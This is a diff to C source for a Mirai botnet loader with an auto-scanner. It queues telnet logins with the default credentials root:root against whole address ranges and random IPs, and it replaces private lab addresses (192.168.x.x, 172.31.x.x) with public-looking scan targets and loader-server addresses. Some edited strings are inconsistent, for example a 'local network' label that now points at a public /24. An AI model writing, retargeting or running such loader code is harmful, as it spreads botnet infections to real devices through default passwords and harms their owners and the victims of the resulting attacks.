@@ -51,12 +51,12 @@ void auto_scan_lab(void)
     struct telnet_info info;
     uint32_t total = 0;
     
-    printf("Scanning 13.53.41\n\n");
+    printf("Scanning 56.228.34\n\n");
     
     for (int i = 1; i <= 254; i++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "13.53.41.%d:23 root:root", i);
+        snprintf(strbuf, sizeof(strbuf), "56.228.34.%d:23 root:root", i);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -114,7 +114,7 @@ void auto_scan_random(void)
     int max_scans = 1000;
     
     srand(time(NULL));
-    printf("Generating %d random IPs in 192.168.x.x\n\n", max_scans);
+    printf("Generating %d random IPs in 16.171.x.x\n\n", max_scans);
     
     for (int i = 0; i < max_scans; i++)
     {
@@ -122,14 +122,14 @@ void auto_scan_random(void)
         uint8_t o3 = rand() % 256;
         uint8_t o4 = (rand() % 254) + 1;
         
-        snprintf(strbuf, sizeof(strbuf), "13.60.46.%d:23 root:root", o4);
+        snprintf(strbuf, sizeof(strbuf), "16.171.37.%d:23 root:root", o4);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
             server_queue_telnet(srv, &info);
             total++;
-            printf("[%4d] Queued: 192.168.%d.%d\n", total, o3, o4);
+            printf("[%4d] Queued: 16.171.%d.%d\n", total, o3, o4);
             usleep(20000);
         }
     }
@@ -150,7 +150,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("172.31.42.90");
+    addrs[0] = inet_addr("13.61.25.35");
 
     if (argc == 2)
         id_tag = args[1];
@@ -162,7 +162,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "13.60.194.27", 80, "13.60.194.27")) == NULL)
+                              1024 * 64, "13.61.25.35", 80, "13.61.25.35")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
@@ -174,7 +174,7 @@ int main(int argc, char **args)
     printf("    Mirai Loader - Auto Scanner\n");
     printf("========================================\n\n");
     printf("1. Mode Manuel\n");
-    printf("2. Scan Auto - Reseau local (192.168.1.0/24)\n");
+    printf("2. Scan Auto - Reseau local (13.61.25.35/24)\n");
     printf("3. Scan Auto - Plage personnalisee\n");
     printf("4. Scan Auto - IPs aleatoires\n\n");
     printf("Choix: ");
@@ -185,7 +185,7 @@ int main(int argc, char **args)
     {
         case 1:
             printf("[*] Mode manuel. Entrez les cibles: ip:port user:pass\n");
-            printf("    Exemple: 192.168.1.11:23 root:root\n\n");
+            printf("    Exemple: 56.228.34.62:23 root:root\n\n");
             
             while (TRUE)
             {
@@ -219,9 +219,9 @@ int main(int argc, char **args)
         case 3:
             {
                 char start_ip[16], end_ip[16];
-                printf("IP de debut (ex: 192.168.1.1): ");
+                printf("IP de debut (ex: 56.228.34.62): ");
                 scanf("%s", start_ip);
-                printf("IP de fin (ex: 192.168.1.254): ");
+                printf("IP de fin (ex: 56.228.34.62): ");
                 scanf("%s", end_ip);
                 auto_scan_range(start_ip, end_ip);
             }
